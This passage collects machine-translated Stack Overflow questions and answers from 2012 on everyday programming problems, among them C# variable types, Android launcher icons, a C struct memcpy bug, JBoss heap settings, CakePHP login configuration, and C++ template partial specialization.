s.GetDirectoriesAsync(null);
/*
in s_GetDirectoriesCompleted method i use e.Result to get ReturnData object but i has none of the members implemented in the service
*/ 
```

我无法访问我实现的属性是否需要完成此操作。

同样，当我在 ReturnData.Data 中返回自定义对象时，我如何在我的应用程序中引用或使用它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T13:33:32.370

如果我是对的，那么您是在谈论 WCF-RIA 服务，对吗？如果是，那么这很简单，你看，你只需要做 3 件事： 1\. 像上面那样在 .Web 端创建一个类。2\. 在您的 DomainService 中创建一个函数（我相信您可能已经添加了:)），返回类型为“ReturnData” 3\. 接下来在应用程序的客户端使用调用操作来调用该函数并获取它返回的值。

# c# - 如何确定变量的类型？（不是对象的类型）

> ID：13491903
> 
> 赞同：8
> 
> 时间：2012-11-21T11:05:43.503
> 
> 标签：c#, .net, visual-studio, immediate-window

我在 Visual Studio 的即时窗口中。有一个变量`p`。如何推断*变量* `p`的类型？

我试过`p.GetType()`了，但这会返回*object* `p`的类型。就我而言，这是一种非常具体的类型（例如，有时`ChessPlayer`，有时`TennisPlayer`）。我想知道变量的类型，即。确定变量上可用的方法的类型`p`。

* * *

编辑：我认为这是一件合理的事情。我正在尝试检查变量`p`，但我不知道它是！通常在 Visual Studio 中，我只需将鼠标悬停在变量上，它就会告诉我它的类型，或者我键入`.`并且自动完成列出它的方法。然而，这些在即时窗口中都不起作用，我所拥有的只是这个变量`p`，我不知道它是什么或者我能用它做什么:(

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T11:11:13.793

c#为此提供了许多方法:)

对于特定类型的确切副本，您需要执行此操作

```
if (p.GetType() == typeof(YourDesiredType)) 
```

如果你想知道 p 是否是 yourdesiredtype 的一个实例，那么

```
if (p is YourDesiredType) 
```

或者你可以试试这个

```
YourDesiredType ydp = p as YourDesiredType; 
```

**在这种情况下（因为我不确定在您的场景中是否有可能）当 OP 想知道编译类型时，我只建议为此使用通用列表**

因为通过保持类型安全列表，每个人都可以轻松跟踪其类型

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-21T12:16:11.850

很惊讶这太难了，最后我写了这个方法，似乎给出了正确的答案。

```
public static class Extensions
{
    public static Type GetVariableType<T>(this T instance)
    {
        return typeof(T);
    }
} 
```

示例用法：

```
void Main()
{
    IList x = new List<int>{};
    x.GetVariableType().Dump();
} 
```

印刷`System.Collections.IList`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-03T05:46:43.020

作为使用即时窗口的替代方法，如果您只想查看变量的类型，您可以简单地添加一个变量监视并在监视窗口中检查类型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:11:12.700

```
System.Object.GetType() 
```

这将返回变量的类型，因为这个类位于每个类派生的层次结构的顶部。

您还可以检查 typeof 函数以获取给定实例的确切类型。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-21T11:15:09.673

我想你可能需要这个

```
if (p is ChessPlayer)
{
    ChessPlayer cp = (ChessPlayer)p;

    //Use ChessPlayer methods
} 
```

# java - 一个安卓应用，一个启动视图，两个图标

> ID：13491909
> 
> 赞同：2
> 
> 时间：2012-11-21T11:06:22.397
> 
> 标签：java, android, android-manifest

我有一个应用程序、一个启动视图、两个应用程序图标和两个应用程序名称。

我必须使用两个应用程序名称和图标，这很重要。应用程序是一样的。

名称和图标随签名类型的不同而变化。免费和非免费签名。

我的应用程序有两个不同的图标和两个不同的名称。我想在我的java代码中改变它。这是可能的？或者在 apk 生成中更改它而不一直更改清单文件。

我在 drawable-hdpi/ 中有 icon1.png 和 icon2.png。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:17:14.700

您可以使用带有参数的 ANT build.xml 文件自动执行不同的构建。在 Google 中有几个关于如何为 Android 执行此操作的示例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:13:09.483

当然，您必须转到**Manifest**文件并注意：

```
<activity
            android:name=".Activity1"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity> 
```

请忽略名称，您会找到您的活动名称。

您想用作第一个活动的活动应该保持原样。但是您不想在启动器中显示的活动需要编辑如下：

```
<activity
                android:name=".Activity2"
                android:label="@string/title_activity_main" >
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />

                </intent-filter>
            </activity> 
```

`<category android:name="android.intent.category.LAUNCHER" />`应该被删除。

这将只创建一个图标和一个名称

```
<android:label="@string/title_activity_main"> 
```

请更改标签

# c - 如何在不破坏堆栈的情况下设置此结构？

> ID：13491912
> 
> 赞同：0
> 
> 时间：2012-11-21T11:06:28.467
> 
> 标签：c

我需要设置以下结构并打印出 addr-array 的内容。

```
typedef struct
{
    uint8                   len;
    uint8                   ch;
    uint8                   cmd;
} ATTR_PACKED
RESPONSE_R;

typedef struct
{
    RESPONSE_R          rspr;
    uint8               addr[SIZEOF_ADDR];
} ATTR_PACKED
RESPONSE_ADDR; 
```

但是，我当前的解决方案是破坏变量周围的堆栈`rspr`。据我所知，这是因为`addr`是一个数组，我设置错了。但我不确定是否如此以及为什么。在调试器上它看起来没问题，直到我在退出函数时收到错误消息。

```
//this code has to be ansi-c
void    OnResponse(uint8 *pPkt){

RESPONSE_R rspr;
//pPkt[0] holds the lenght of the received response, which equals to sizeof(rspadr)
//before this was ok, but I guess, now it is not, because RESPONSE_R stores just the
//pointer, not the whole array
memcpy(&rspr,pPkt,pPkt[0]-sizeof(rspr));            

switch(rspr.cmd){
 case CMD_READ_ADDR:
   RESPONSE_ADDR rspadr;
   memcpy(&rspadr,pPkt,pPkt[0]);
   //nevermind the cout, this is for debug only     
   cout << "ADDR: " << endl;                
   printf("%02x",rspadr.addr[0]);
   break;
 default:
   break;
 }
} 
```

`rspadr`获取正确的数据，那么为什么我要用这段代码破坏我的堆栈呢？

*编辑*

`memcpy`用于`pPkt`确定大小，因为`pPkt[0]`保存传输的响应字节的大小。但也许这里有一点，我应该将其更改为直接使用结构大小。但是 - 这不是这里的主要问题。

`pPkt[]`主要的麻烦制造者是，当这些结构之一有一个数组时，我如何将缓冲区中的数据转换为我的结构，比如 RESPONSE_ADDR 有？

`pPkt[128]`数组的原始视图

```
[0x0] = 0x09
[0x1] = 0x00
[0x2] = 0x02
[0x3] = 0x00
[0x4] = 0x16
[0x5] = 0x01
[0x6] = 0x02
[0x7] = 0x03
[0x8] = 0x04

[0xa] = 0x00
[0xb] = 0x00
[0xc] = 0x00
...
[0x127] = 0x00 
```

以上是我得到的输入。现在，我需要设置一个`RESPONSE_R`对象，以便选择由该`cmd`部分确定的例程（由 pPkt[2] 表示）和一个`RESPONSE_ADDR`对象以获取地址，即`001601020304`.

我非常希望能够使用类似`rsp.cmd`and的东西`rspadr.addr[0]`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:13:02.820

这条线看起来很可疑：

```
memcpy(&rspr,pPkt,pPkt[0]-sizeof(rspr)); 
```

的第三个参数`memcpy`是要复制的字节数，不能超过`RESPONSE_R`.

你的意思是

```
memcpy(&rspr,pPkt,sizeof(rspr)); 
```

?

**更新 2**

这个不需要任何解决方案的解决方案怎么样`memcpy`？

```
const RESPONSE_R* p_rspr = (const RESPONSE_R*)pPkt;

switch(p_rspr->cmd){
 case CMD_READ_ADDR:
   const uint8* addr = pPkt+sizeof(RESPONSE_R);
   //nevermind the cout, this is for debug only     
   cout << "ADDR: " << endl;    
   for (uint i = 0; i != p_rspr->len; ++i)            
     printf("%02x", addr[i]);
   break;
 default:
   break;
 } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T11:16:42.337

您能否重新检查以下语句。

```
RESPONSE_R rspr;
memcpy(&rspr,pPkt,pPkt[0]-sizeof(rspr)); 
```

看起来您正在尝试以不正确的方式进行复制。

# .net - .Net 自定义构建任务，用于加密转换后的 web.config

> ID：13491915
> 
> 赞同：1
> 
> 时间：2012-11-21T11:06:36.547
> 
> 标签：.net, msbuild, task, publish

为了发布我的 .Net Web 应用程序，我需要调用自定义构建任务。此任务采用转换后的 web.config 并使用给定的提供程序保护某些部分。定义任务的程序集与项目一起编译。

该任务需要加载某些程序集才能成功保护 web.config 部分。所需的程序集 dll 通过属性传递给任务，然后由 Assembly.LoadFrom() 加载。

我已经成功地通过 $(_WebConfigTransformOutput) 属性获取了转换后的 web.config。但是，在调用该工具时，我需要一些已编译并包含在包中的程序集的位置。

我的问题是如何引用复制到 PackageTmp 目录的 dll，我似乎找不到引用该目录位置的属性。

构建目标示例（加密任务是我自定义包含的任务，$(Somelocation?) 必须最终指向包 bin 目录）：

```
<Target Name="EncyptWebConfig" AfterTargets="PipelineCollectFilesPhase">
  <PropertyGroup>
  <ConfigFile>$(_WebConfigTransformOutput)</ConfigFile>
  <Sections>
    connectionStrings;
    caracal/authenticationSettings;
    caracal/cookieAuthentication;
    system.net/mailSettings;
  </Sections>
  <!-- The first assembly contains the SecurityProvider,
       The second and third assemblies are for the caracal/* sections
  -->
  <Assemblies>
    $(Somelocation?)\ConfigProtectionAssembly.dll;
    $(Somelocation?)\Caracal.Application.dll;
    $(Somelocation?)\Caracal.AuthenticationModule.dll;
  </Assemblies>
  <Provider>CaracalConfigEncryption</Provider>
</PropertyGroup>

<Encrypt ConfigFile="$(ConfigFile)" Assemblies="$(Assemblies)" Provider="$(Provider)" Sections="$(Sections)"/> 
```

# java-ee-6 - 如何在 Jboss 7.1.1 中增加堆大小

> ID：13491918
> 
> 赞同：1
> 
> 时间：2012-11-21T11:06:47.237
> 
> 标签：java-ee-6, jboss7.x

我在域模式下使用 Jboss 7.1.1。如何增加堆大小？我在 host.xml 和 domain.xml 中看到了堆大小标记。我可以在哪里更改堆大小？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-07-02T14:42:55.163

独立的配置在配置文件中：bin/appclient.conf.bat

```
set "JAVA_OPTS=-Xms64M -Xmx1024M -XX:MaxPermSize=512M" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-02-20T15:51:50.230

1) 转到 $JBOSS_HOME/bin/standalone.conf（或者如果您运行的名称与该名称不同）

2）转到它说`"JAVA_OPTS="-Xms256m -Xmx1024m -XX:MaxPermSize=256m`......”的行

3）根据您的要求编辑该行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T13:52:48.583

有几种方法可以在域模式下配置 JVM 选项。

1 - 一个服务器组的所有服务器的配置

```
 <server-group name="main" profile="full"> 
    <jvm name="default">
    <heap size="256m" max-size="512m"/>
       <permgen max-size="256m"/>
    </jvm>
    ...
    </server-group> 
```

`

2 - 主机所有服务器的通用配置

```
<jvms>
  <jvm name="default">
    <heap size="64m" max-size="256m"/>
    <permgen size="256m" max-size="256m"/>
    <jvm-options>
      <option value="-server"/>
     </jvm-options>
    </jvm>
</jvms> 
```

3 - 覆盖一台服务器的通用配置

```
<server name="server1" group="main“&gt; 
  <jvm name="default">
    <heap size="64m" max-size="256m"/>
  </jvm>
  ...
</server> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-09-17T11:02:48.497

我已经提到了在**Linux**环境中**增加堆大小**所需的配置更改。

 **转到以下位置并**编辑**以下**文件**。

```
bin/standalone.conf 
```

**搜索**以下行，

```
JAVA_OPTS 
```

并相应地更改它以满足您的**堆大小需求**

```
-Xms1303m: initial heap size in megabytes
-Xmx1303m: maximum heap size in megabytes

JAVA_OPTS="-Xms1024M -Xmx2048M -XX:MaxPermSize=2048M -XX:MaxHeapSize=2048M" 
```

最后保存工作后，**重启**服务器。**

# c# - 在 c# 中获取已安装的驱动器

> ID：13491921
> 
> 赞同：6
> 
> 时间：2012-11-21T11:06:58.623
> 
> 标签：c#

`DriveInfo.GetDrives()`将枚举使用驱动器号安装的所有卷，但是有什么方法（无需 p/调用 Win32）来枚举原始卷，或者查看可能安装在文件夹中而不是驱动器号中的卷？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T11:10:27.570

是的，使用 WMI（Windows 管理界面）

[Win32_DiskDrive](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa394132%28v=vs.85%29.aspx)类包含有关物理硬盘驱动器的信息，然后可以进一步检查这些信息以获取分区列表。

还有一个不错的[从 C# 和 .Net 使用 WMI的教程](http://code.msdn.microsoft.com/windowsdesktop/Using-WMI-with-C-4e5a9ee1)

# python - Django中urlpatterns的url（）和元组有什么区别？

> ID：13491922
> 
> 赞同：4
> 
> 时间：2012-11-21T11:07:05.953
> 
> 标签：python, django, url

所以在 Django 中，下面两行 url 代码的工作方式相同：

```
urlpatterns = patterns('',
    url(r'^login/$', 'django.contrib.auth.views.login'),
    (r'^login/$', 'django.contrib.auth.views.login')
) 
```

AFAIK，唯一的区别是我可以定义`name='login'`，所以我可以用它来反转 url。但除此之外，还有其他区别吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-21T11:26:57.593

没有任何区别。看看 中的`patterns`函数`django.conf.urls.__init__.py`，如果你的 url 是 a`list`或者它在被附加到可用模式列表之前无论如何都被函数`tuple`包裹起来。`url`

# android - 在同一设备上运行的单独版本？

> ID：13491924
> 
> 赞同：1
> 
> 时间：2012-11-21T11:07:23.233
> 
> 标签：android, android-manifest

我创建了一个 android 应用程序并将其安装在我的设备上。
现在我已经更改了这个应用程序的名称和图标。

是否可以将其安装在“以前的”应用程序旁边？
当我尝试这个时，它会覆盖前一个。
（我不希望更改包名称，因为想要多次这样做）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:08:38.290

不，不可能按照您想要的方式进行。应用程序的名称无关紧要（仅适用于人类）。包名称（`package`的属性`<manifest>`很重要，因此您需要以不同的方式命名两个构建的包以实现此目的。没有其他方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:09:06.947

您将不得不更改包名称。

# php - 重新加载时打开可扩展的 jQuery 内容

> ID：13491933
> 
> 赞同：5
> 
> 时间：2012-11-21T11:07:36.357
> 
> 标签：php, jquery, wordpress, jquery-plugins

我在我的固定标题中内置了一个 jQuery 可折叠插件。（可以点击右上角的按钮打开）

我的问题如下，当我打开页面时，重新加载或单击一个链接，它会自动打开一秒钟。我希望它停止这样做，而仅在有人实际单击按钮时才打开。

我不知道要在此处添加代码的哪一部分，所以我上传了两个文件。

这是[php文件的代码](http://codepad.org/AGdvesbD)

这是[jQuery文件的代码](http://codepad.org/kSI0lL0a)

对不起给您带来不便。我是这个网站的新手，我刚开始建立自己的网站，但我愿意学习。

问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:39:12.440

尝试将包含内容的容器设置为 display:none 在您的 css 文件中开始。

然后当单击按钮时更改显示值。您可能不需要在此处更改显示值，因为刚刚激活并显示它的 jQuery 可能工作正常。

# authentication - 无法使用不同的表登录 cakephp

> ID：13491937
> 
> 赞同：0
> 
> 时间：2012-11-21T11:07:47.200
> 
> 标签：authentication, login, cakephp-2.0

我在登录表单中遇到问题 $this->Auth->login() 总是返回 false。我为用户帐户使用不同的表名。以下是我的代码

HgAdminscontroller.php

```
 <?php
    // app/Controller/UsersController.php
    class HgAdminsController extends AppController 
{
    public function beforeFilter() 
    {
        parent::beforeFilter();
        //$this->Auth->allow('add', 'logout');
    }
    public function index() {
        $this->HgAdmin->recursive = 0;
        $this->set('users', $this->paginate());
    }
    /*
public function add() {
if ($this->request->is('post')) {
$this->HgAdmin->create();
if ($this->HgAdmin->save($this->request->data)) {
$this->Session->setFlash(__('The user has been saved'));
$this->redirect(array('action' => 'index'));
} else {
$this->Session->setFlash(__('The user could not be saved. Please, try again.'));
}
}
}*/
    public function login() {

    if ($this->request->is('post')) {
    echo AuthComponent::password($this->data['password']);
    debug($this->data);
        if ($this->Auth->login()) {
        $this->redirect($this->Auth->redirect());
        } else {
        $this->Session->setFlash(__('Invalid username or password, try again'));
        }
    }
    }
    public function logout() {
        $this->redirect($this->Auth->logout());
    }
}
?>

appController.php
App::uses('Controller', 'Controller');

/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @package       app.Controller
 * @link http://book.cakephp.org/2.0/en/controllers.html#the-app-controller
 */
    class AppController extends Controller {
    public $components = array(
        'Session',
        'Auth' => array(
        'loginRedirect' => array('controller' => 'posts', 'action' => 'index'),
        'logoutRedirect' => array('controller' => 'pages', 'action' => 'display', 'home')
        )
    );
    public function beforeFilter() {
        $this->Auth->allow('index', 'view');
//      Security::setHash('md5');
        $this->Auth->userModel = 'hg_admins';
        $this->Auth->loginAction = array( 'controller' => 'HgAdmins', 'action' => 'login' );
    }
//...
}

HgAdmin.php //model
<?php 
class HgAdmin extends AppModel {
    var $name= "hg_admin";
    public $validate = array(
        'username' => array(
        'required' => array(
        'rule' => array('notEmpty'),
        'message' => 'A username is required'
        )
    ),
        'password' => array(
        'required' => array(
        'rule' => array('notEmpty'),
        'message' => 'A password is required'
        )
    )
    );

?>

Login view

<h2>Login Here</h2>
<?php echo $this->Session->flash('auth'); 
echo $this->form->create('HgAdmin');
echo $this->Form->input("username");
echo $this->Form->input("password");
echo $this->form->end(__("Login"));
?> 
```

我检查了数据库密码值是否与来自 AuthComponent::password($this->data['password']); 所以不知道为什么它是失败的。如果我使用 cakephp 的添加功能来添加用户，则添加的用户使用相同的密码，但无法使用该密码登录。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:54:49.350

```
public $components = array(
 'Auth' => array(
    'loginAction' => array(
        'controller' => 'writers',
        'action' => 'login'

    ),
    'loginRedirect' => array(
        'controller' => 'home',
        'action' => 'index'
    ),
    'logoutRedirect' =>array (
        'controller' => 'home',
        'action' => 'index'
    ),
     'authError' => 'You have to login to access this page',
    'authenticate' => array(
        'Form' => array(
            'userModel' =>'Writer',
            'fields' => array('username' => 'email')
        )
    ),
    'scope' =>array('User.status' => '1'),
    'authorize' => array('Controller')
),
  'Session',
); 
```

您必须使用要在其上应用身份验证的模型的名称，即我在 db 中为我的表编写器使用了 Writer。检查更改！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-27T03:50:43.127

@huzefam 答案是正确的，但我只想添加以防有人使用 Bcrypt 身份验证。这里我使用 Accounts 表。应该添加这样的东西。希望这有帮助

```
public $components = array(
        'Auth' => array(
            'loginAction' => array(
                'controller' => 'accounts',
                'action' => 'admin_login'

            ),
            'loginRedirect' => array(
                'controller' => 'orders',
                'action' => 'admin_index'
            ),
            'logoutRedirect' =>array (
                'controller' => 'accounts',
                'action' => 'admin_login'
            ),
            'authError' => 'You have to login to access this page!',
            'authenticate' => array(
                'Blowfish' => array(
                    'userModel' =>'Account',
                    'fields' => array('password' => 'password')
                )
            ),
            'authorize' => array('Controller')
        ),
        'RequestHandler',
        'Paginator',
        'Session'
    ); 
```

# xbap - 具有多个页面的 XBAP 项目

> ID：13491940
> 
> 赞同：1
> 
> 时间：2012-11-21T11:07:54.000
> 
> 标签：xbap

我的应用程序中有一个`XBAP(abc.windowloading)`项目，`Page1.xaml, Page2.xmal etc...`
当我尝试`creating abc.windowloading.XBAP`在部署目录中部署它的文件和所有其他所需文件并将其托管到时`Iframes`，但我的要求是将第一页（`Page1.xaml`）加载到第一页`IFrame`和第二页`page(Page2.xaml)`到第二页`IFrame`，如何我能做这个任务吗？

```
iframe src='abc.windowloading.xbap\Page1.xaml' width='1024' height='1024'

iframe src='abc.windowloading.xbap\Page2.xaml' width='1024' height='1024' 
```

它不以这种方式工作

# javascript - 有人可以解释为什么我的 javascript 不工作吗？

> ID：13491946
> 
> 赞同：0
> 
> 时间：2012-11-21T11:08:29.023
> 
> 标签：javascript, html, css

有人可以解释一下我在使用 Javascript 显示隐藏的 DIV 时哪里出错了。我已经查看了以前的答案，但它们似乎不起作用。

```
 .newinner
    {
        display: none;
        padding-left: 10px;
        padding-top: 10px;
        background: white;
        width: 905px;
        margin: auto;
        height: 400px;
    }
    </style>
    <script>
    function ShowDiv(newinner)
    {
        document.getElementsByClassName("newinner").style.display="block";
    }
    </script> 
```

下面是DIV

```
 <button type="button" name="faddress" value="Show Div" onClick="showDiv('newinner')" />Find Address</button></div>
    <div class="newform">
    <div class="newinner">
    <form>
    <div class="formtitle"><b>To request this brochure please fill out the form below.</b></div>
    <div class="ntitle"><b>First Name*:</b><br><select>
      <option value="title">Title</option>
      <option value="mr">Mr</option>
      <option value="mrs">Mrs</option>
      <option value="miss">Miss</option>
      <option value="ms">Ms</option>
    </select>
    </div>
    <div class="fname">
    <input type="firstname" name="fname" /></div>
    <div class="lname"><b>Last Name:*</b><input type="lastname" name="lname" /></div>
    </form>
    </div>
    </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:11:32.630

newinner 被定义为一个类，并且您正在搜索一个 id 等于 newinner 的节点......而且您没有在您发布的代码中的任何地方调用 ShowDiv()

**- 更新 -**

我看到您自我最初回答以来已经更新了问题，但代码中仍然存在一些问题。

`document.getElementsByClassName`返回给定类的所有元素；它是一个类似数组的结构。所以通常你必须遍历每个元素；但在这种情况下，您可以使用 an`id`代替，然后使用该`document.getElementById`方法，该方法在找到时仅返回所选元素，`null`否则。

所以你可以重写`showDiv`为：

```
function ShowDiv (id) {
    document.getElementById(id).style.display = "block";
}

<button type="button" name="faddress" onClick="showDiv('newinner')">
    Find Address
</button>

<div id="newinner">
    ...
</div> 
```

还要记住，`onClick`属性的使用有利于快速原型设计或演示目的；如果您要在生产中使用此代码，我建议您改用[document.addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:11:43.707

您没有在页面中的任何位置调用该函数

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:22:53.360

如果你想使用 document.getElementById() 方法，那么给你的 DIV 一个 ID。

只需将您的第 2 行从更改`<div class="newinner">`为`<div class="newinner" id="newinner">`

# zend-framework - Zend_Form 与 A jax/json

> ID：13491960
> 
> 赞同：0
> 
> 时间：2012-11-21T11:09:24.267
> 
> 标签：zend-framework, jquery, zend-form

将 Zend_Form 与 A​​jax 一起使用，我有点迷失了。我在一个扩展 Zend_Form 的类中有一个表单，它从我的控制器调用，这样：

*GoodAddGroup.php*

```
class Default_Form_GoodAddGroup extends Zend_Form {
    (...)

    public function init()
    {
        $this->setMethod('post');
        $this->setAction("process-add-group");
        $this->setName("addgroupgood");

        // Load Elements class
        require "Form/Elements.php";
        $magElements = new Elements();

        // Category
        $categoryElement = $magElements->getCategorySelectField();
        $categoryElement->setDecorators($this->elementDecorators);

        // Barcode
        $barcodeElement = $magElements->getGoodBarcodeTextField();
        $barcodeElement->setDecorators($this->elementDecorators);

        (...)

        // Add elements to the form
        $this->addElements(array(
            $categoryElement,
            //$codeElement,
            $barcodeElement,
            $serialElement,
            $warehouseElement,
            $submitButtonElement
        ));
        $this->setDecorators($this->formDecorators);
    }
} 
```

在*GoodsController.php 中*

```
private function getAddGroupForm()
{
    return new Default_Form_GoodAddGroup();
}

public function addGroupAction()
{
    // Initialize the form for the view.
    $this->view->form = $this->getAddGroupForm();
}

public function processAddGroupAction()
{

        $form = $this->getAddGroupForm();
    (...)

    if ($_POST)
    {
        if ($form->isValid($_POST))
        {
            // Do things
        } else {
            $this->view->form = $form;
        }
    }
} 
```

Basically, the form has a category select field, when selecting a category, a second "code" selector is added filled with the items related to this category. 当显示带有表单的页面 (http://myapp/goods/add-group) 时，一切正常，ajax 调用完成了它的工作，第二个选择字段被添加并很好地输入，但是正如你所看到的，表单处理是通过 processAddGroupAction() 完成的，该方法获取表单的实例以获取其值并在出现问题时重新显示它。但是那样，我的“新”选择字段不再存在，所以我永远无法验证表单。

这是我第一次尝试在 Zend 中使用 ajax/json，我想我需要帮助。

谢谢你。

**编辑：**按要求添加视图代码

```
<script>
    $(function(){
        $("#cats").change(function(){
            getSelectBox(this);
        });

        $("#code").parent().parent().css('display', 'none');
        getSelectBox($("#cats"));
    });

    function getSelectBox(element)
    {
        if($(element).val() != '')
        {
            $("#code").parent().parent().css('display', 'block');
            if ($('#code').length <= 0) {
                $("#cats").after('<select name="code" id="code" style="margin-left:10px"></select>');
            }
            $.getJSON("/goods/json-get-codes-from-category", {id: $(element).val(), ajax: "true"}, function(j){
                console.log(j);
                var options = "";
                jQuery.each(j, function(i, val) {
                    options += '<option value="' + i + '">' + i + val + '</option>';
                });
                $("#code").html(options);
            });
        }
    }
</script>

<?php echo $this->form; ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:02:53.077

您可以在表单中添加选择元素“代码”，但不要在视图中显示（它将从 js 创建）。因此，当表单发布时，“代码”也将被验证，因为它位于 $_POST 中。
发布后，您必须显示不带 `$("#cats").change({..})`. 您可以通过将 js 代码吐到函数中来完成它

```
<script>
    $(function(){
        $("#cats").change(function(){
            getSelectBox(this);
        });

        getSelectBox($("#cats"));
    });

    function getSelectBox(element)
    {
        if($(element).val() != '')
        {
            if ($('#code').length <= 0) {
                $("#cats").after('<select name="code" id="code" style="margin-left:10px"></select>');
            }
            $.getJSON("/goods/json-get-codes-from-category", {id: $(element).val(), ajax: "true"}, function(j){
                console.log(j);
                var options = "";
                jQuery.each(j, function(i, val) {
                    options += '<option value="' + i + '">' + i + val + '</option>';
                });
                $("#code").html(options);
            });
        }
    }
</script> 
```

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T11:31:04.700

好的，我找到了解决方案！我发布它以防它对其他人有用。我知道问题出在哪里，但不知道如何解决。

在表单处理时，该操作不存在新的选择元素，因为它已使用 javascript 添加到视图中。为了解决这个问题，我们需要通知动作关于新字段，为此，我们首先需要在表单类中覆盖 Zend_Form 的方法“isValid”：

```
public function isValid($values)
{
    $values = $this->_modifyElements($values);   
    return parent::isValid($values);
} 
```

然后创建一个方法“_modifyElements”，通过添加新元素来修改表单：

```
protected function _modifyElements($values)
    {
        // Search for codes
        $dbu = new DbUtils();
        $codes = $dbu->getCodesFromCategory($values['cats']);

        // Remove the current code element
        $this->removeElement('code');

        // Create a new element
        $codeElement = new Zend_Form_Element_Select('code', array());
        $codeElement->setLabel(_('Code :'));
        $codeElement->setRequired(true);
        $codeElement->addMultiOptions($codes);
        $codeElement->setValue($values['code']);
        $codeElement->setDecorators($this->elementDecorators);
        $this->addElement($codeElement);

        return $values;
    } 
```

我们也必须重写方法“populate”：

```
public function populate(array $values)
{
    $values = $this->_modifyElements($values);   
    return parent::populate($values);
} 
```

瞧。它对我有用；> 所有关于此的功劳都归 Mohamed：http: [//jamandcheese-on-phptoast.com/2009/12/13/on-fly-elements-in-zend_form/](http://jamandcheese-on-phptoast.com/2009/12/13/on-fly-elements-in-zend_form/)

# c++ - 模板偏特化问题

> ID：13491964
> 
> 赞同：4
> 
> 时间：2012-11-21T11:09:30.943
> 
> 标签：c++, templates, specialization, partial-specialization

我正在尝试为数学编程编写一个大小和类型的通用向量类。我在部分专业化方面遇到问题。

当我尝试将向量类的成员方法专门化为给定大小时，就会出现问题。

我可以提供一个简单的例子：

```
template <size_t Size, typename Type>
class TestVector
{
public:
    inline TestVector (){}
    TestVector cross (TestVector const& other) const;
};

template < typename Type >
inline TestVector< 3, Type > TestVector< 3, Type >::cross (TestVector< 3, Type > const& other) const
{
    return TestVector< 3, Type >();
}

void test ()
{
    TestVector< 3, double > vec0;
    TestVector< 3, double > vec1;
    vec0.cross(vec1);
} 
```

尝试编译这个简单的示例时，我收到一个编译错误，指出“交叉”专业化与现有声明不匹配：

```
error C2244: 'TestVector<Size,Type>::cross' : unable to match function definition to an existing declaration
see declaration of 'TestVector<Size,Type>::cross'
definition
    'TestVector<3,Type> TestVector<3,Type>::cross(const TestVector<3,Type> &) const'
    existing declarations
    'TestVector<Size,Type> TestVector<Size,Type>::cross(const TestVector<Size,Type> &) const' 
```

我试图将 cross 声明为模板：

```
template <size_t Size, typename Type>
class TestVector
{
public:
    inline TestVector (){}

    template < class OtherVec >
    TestVector cross (OtherVec const& other) const;
};

template < typename Type >
TestVector< 3, Type > TestVector< 3, Type >::cross< TestVector< 3, Type > > (TestVector< 3, Type > const& other) const
{
    return TestVector< 3, Type >();
} 
```

此版本通过编译但在链接时失败：

```
 unresolved external symbol "public: class TestVector<3,double> __thiscall TestVector<3,double>::cross<class TestVector<3,double> >(class TestVector<3,double> const &)const 
```

我在这里想念什么？谢谢，弗洛伦特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T14:41:37.923

一种方法是定义`cross`为“函子”（即带有 的类`operator()`）。

```
template<size_t S, typename T>
class Vec {
  // ... stuff
  friend struct Cross<S, T>;
  Vec<S, T> cross(const Vec<S, T>& other) {
    return Cross<S, T>()(*this, other);
  }
  // ... more stuff
};

template<size_t S, typename T> struct Cross {
  Vec<S, T> operator() (const Vec<S, T>& a, const Vec<S, T>& b) {
    // general definition
  }
};

// Partial specialization
template<typename T> struct Cross<3, T> {
  vec<3, T> operator() (const Vec<3, T>& a, const Vec<3, T>& b) {
    // specialize definition
  }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-12T12:00:13.040

您不能部分专门化一个方法。您可以在某些条件下超载。在这里，您可以选择您的课程的部分专业化

```
template <size_t Size, typename Type> class TestVector
{
public:
    inline TestVector (){}
    TestVector cross (TestVector const& other) const;
}; 
```

具有一般行为的定义：

```
TestVector<size_t Size, typename Type>::cross (TestVector const& other) const {
     // general
} 
```

和一个专门的模板，使您能够定义案例 int 的特定行为是 3

```
template <typename Type> class TestVector<3, Type>
{
public:
    inline TestVector (){}
    TestVector cross (TestVector const& other) const;
}; 
```

自定义行为的定义：

```
